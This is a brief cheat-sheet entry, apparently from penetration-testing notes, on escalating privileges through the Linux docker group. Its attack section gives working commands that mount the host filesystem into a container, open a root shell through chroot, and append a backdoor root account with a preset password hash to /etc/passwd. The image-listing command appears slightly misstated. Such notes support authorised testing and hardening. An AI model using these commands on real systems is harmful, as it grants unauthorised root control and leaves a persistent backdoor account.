## Docker Group

The **docker** group controls access to and management of Docker containers on the system. This can represent a potential privilege escalation risk, as it allows an attacker to access the containers and their data, and even mount host volumes in Docker with full permissions.

## Attack

An attacker could mount the original host filesystem within a Docker instance, allowing them to modify the entire filesystem as root from within the container.

```bash
# List Docker images
docker image

# Shell in Docker with the host filesystem mounted
docker run -it --rm -v /:/mnt [imagename] chroot /mnt bash

# Add a new root user
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd
```
